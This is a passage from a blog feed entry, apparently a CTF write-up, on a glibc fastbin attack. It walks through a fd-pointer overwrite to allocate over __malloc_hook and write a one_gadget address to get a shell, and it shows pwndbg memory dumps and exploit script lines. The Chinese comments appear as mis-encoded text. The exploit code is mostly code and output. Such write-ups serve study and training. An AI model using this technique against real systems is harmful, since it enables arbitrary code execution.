class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757000</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757020</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757040</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757060</span><br>Size: <span class="hljs-number">0x71</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x5555557570d0</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk<br>Addr: <span class="hljs-number">0x5555557570f0</span><br>Size: <span class="hljs-number">0x90</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757180</span><br>Size: <span class="hljs-number">0x20e61</span><br>pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000071</span> <span class="hljs-comment">#index4ï¼ˆfastbinï¼‰</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x5555557570f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index5ï¼ˆunsortedbinï¼‰</span><br><span class="hljs-number">0x555555757100</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000020</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index6</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:  <span class="hljs-number">0x0000555555757010</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x5fcead98750</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757050</span>    <br><span class="hljs-number">0x5fcead98760</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index2     </span><br><span class="hljs-number">0x5fcead98770</span>:  <span class="hljs-number">0x0000555555757090</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x5fcead98780</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:  <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br>                <span class="hljs-comment">#index4ï¼ˆæ­¤å¤„å‘ç”Ÿäº†æ”¹å˜ï¼‰#ï¼ˆæ­¤å¤„å‘ç”Ÿäº†æ”¹å˜ï¼‰     </span><br><span class="hljs-number">0x5fcead987a0</span>:  <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000001</span><br>                <span class="hljs-comment">#ï¼ˆæ­¤å¤„å‘ç”Ÿäº†æ”¹å˜ï¼‰     #index6ï¼ˆåŸindex5ï¼‰</span><br><span class="hljs-number">0x5fcead987b0</span>:  <span class="hljs-number">0x0000000000000080</span>  <span class="hljs-number">0x0000555555757120</span><br></code></pre></td></tr></tbody></table></figure><h4 id="2-3-ä¿®æ”¹index4çš„fdæŒ‡é’ˆ"><a href="#2-3-ä¿®æ”¹index4çš„fdæŒ‡é’ˆ" class="headerlink" title="2-3 ä¿®æ”¹index4çš„fdæŒ‡é’ˆ"></a>2-3 ä¿®æ”¹index4çš„fdæŒ‡é’ˆ</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#ç„¶åä¿®æ”¹fdæŒ‡é’ˆ,é€šè¿‡index2å¾€index4ä¸Šå†™ä¸ºmalloc_hook,è¿™æ ·å†æ¬¡ç”³è¯·çš„æ—¶å€™ä¼šåˆ†é…åˆ°è¿™ä¸ªåœ°å€</span><br><span class="hljs-comment">#ä½†é—®é¢˜æ˜¯æˆ‘ä»¬å»ç”³è¯·çš„æ—¶å€™ä¼šæ£€æŸ¥sizeæ˜¯ä¸æ˜¯ fakefd + 8 == å½“å‰fastbinçš„å¤§å°</span><br><span class="hljs-comment">#è¿™ä¸ªåœ°å€æ˜¯main_arena-0x40+0xd,å…·ä½“çœ‹åé¢å›¾ç‰‡è§£é‡Š</span><br>payload = p64(libc_base+<span class="hljs-number">0x3c4aed</span>)<br>fill(<span class="hljs-number">2</span>, payload)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000071</span> <span class="hljs-comment">#index4ï¼ˆfastbinï¼‰</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x00007ffff7dd1aed</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#æ›´æ”¹index4çš„fdæŒ‡é’ˆ</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x5555557570f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index5ï¼ˆunsortedbinï¼‰</span><br><span class="hljs-number">0x555555757100</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000020</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index6</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/16gx <span class="hljs-number">0x00007ffff7dd1aed</span><br><span class="hljs-number">0x7ffff7dd1aed</span> &lt;_IO_wide_data_0+<span class="hljs-number">301</span>&gt;:<span class="hljs-number">0xfff7dd0260000000</span><span class="hljs-number">0x000000000000007f</span><br><span class="hljs-number">0x7ffff7dd1afd</span>:<span class="hljs-number">0xfff7a92ea0000000</span><span class="hljs-number">0xfff7a92a7000007f</span><br><span class="hljs-number">0x7ffff7dd1b0d</span> &lt;__realloc_hook+<span class="hljs-number">5</span>&gt;:<span class="hljs-number">0x000000000000007f</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b1d</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b2d</span> &lt;main_arena+<span class="hljs-number">13</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b3d</span> &lt;main_arena+<span class="hljs-number">29</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b4d</span> &lt;main_arena+<span class="hljs-number">45</span>&gt;:<span class="hljs-number">0x5555757080000000</span><span class="hljs-number">0x0000000000000055</span><br><span class="hljs-number">0x7ffff7dd1b5d</span> &lt;main_arena+<span class="hljs-number">61</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h4 id="2-4-æ§åˆ¶-malloc-hook"><a href="#2-4-æ§åˆ¶-malloc-hook" class="headerlink" title="2-4 æ§åˆ¶__malloc_hook"></a>2-4 æ§åˆ¶__malloc_hook</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#è¿™æ—¶å€™å†å»ç”³è¯·ä¸¤ä¸ª,ç¬¬ä¸€ä¸ªæ˜¯ç»™å‰é¢freeçš„index4,ç¬¬äºŒä¸ªå°±ä¼šåˆ†é…åˆ°malloc_hookå¤„</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index7</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:  <span class="hljs-number">0x0000555555757010</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x5fcead98750</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757050</span>    <br><span class="hljs-number">0x5fcead98760</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000010</span><br>                <span class="hljs-comment">#index2     </span><br><span class="hljs-number">0x5fcead98770</span>:  <span class="hljs-number">0x0000555555757090</span>  <span class="hljs-number">0x0000000000000001</span><br>                                    <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x5fcead98780</span>:  <span class="hljs-number">0x0000000000000010</span>  <span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:  <span class="hljs-number">0x0000000000000001</span>  <span class="hljs-number">0x0000000000000060</span><br>                <span class="hljs-comment">#index4ï¼ˆæ­¤å¤„å‘ç”Ÿäº†æ”¹å˜ï¼‰#ï¼ˆæ­¤å¤„å‘ç”Ÿäº†æ”¹å˜ï¼‰     </span><br><span class="hljs-number">0x5fcead987a0</span>:  <span class="hljs-number">0x0000555555757090</span>  <span class="hljs-number">0x0000000000000001</span><br>                <span class="hljs-comment">#ï¼ˆæ­¤å¤„å‘ç”Ÿäº†æ”¹å˜ï¼‰     #index6ï¼ˆåŸindex5ï¼‰</span><br><span class="hljs-number">0x5fcead987b0</span>:  <span class="hljs-number">0x0000000000000080</span>  <span class="hljs-number">0x0000555555757120</span><br><span class="hljs-number">0x5fcead987c0</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000060</span><br>    <span class="hljs-comment">#index7</span><br><span class="hljs-number">0x5fcead987d0</span>:<span class="hljs-number">0x00007ffff7dd1afd</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h4 id="2-5-å†™å…¥-one-gadget-å¹¶-getshell"><a href="#2-5-å†™å…¥-one-gadget-å¹¶-getshell" class="headerlink" title="2-5 å†™å…¥ one_gadget å¹¶ getshell"></a>2-5 å†™å…¥ one_gadget å¹¶ getshell</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#ç„¶åå¾€malloc_hookä¸Šå†™one_gadgetçš„åœ°å€</span><br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload += p64(libc_base+<span class="hljs-number">0x4527a</span>)<br>fill(<span class="hljs-number">6</span>, payload)<br>gdb.attach(p)<br></code></pre></td></tr></tbody></table></figure><h4 id="2-6-æœ€åç”³è¯·ä¸€ä¸ªchunk"><a href="#2-6-æœ€åç”³è¯·ä¸€ä¸ªchunk" class="headerlink" title="2-6 æœ€åç”³è¯·ä¸€ä¸ªchunk"></a>2-6 æœ€åç”³è¯·ä¸€ä¸ªchunk</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x60</span>)<br></code></pre></td></tr></tbody></table></figure><p>æœ€åå°±èƒ½get shell äº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;fastbin-attackä¸­çš„Arbitrary-Allocï¼ˆä¾‹é¢˜ï¼‰&quot;&gt;&lt;a href=&quot;#fastbin-attackä¸­çš„Arbitrary-Allocï¼ˆä¾‹é¢˜ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;fastbin_attackä¸­çš„Arbitr</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="fastbin attack" scheme="https://kylinxin.github.io/tags/fastbin-attack/"/>
    
  </entry>
  
</feed>
